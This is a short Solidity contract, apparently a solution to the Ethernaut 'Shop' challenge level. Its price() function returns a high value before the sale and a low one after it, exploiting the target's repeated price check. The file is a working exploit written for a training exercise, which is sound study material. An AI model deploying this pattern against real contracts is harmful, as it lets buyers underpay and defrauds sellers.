pragma solidity 0.4.24;

import "levels/Shop.sol";

contract ShopHack is Buyer {
    Shop target;

    constructor(address _target) public {
        target = Shop(_target);
    }

    function attack() public {
        target.buy();
    }

    function price() external view returns (uint) {
        return target.isSold() ? 1 : 100;
    }
}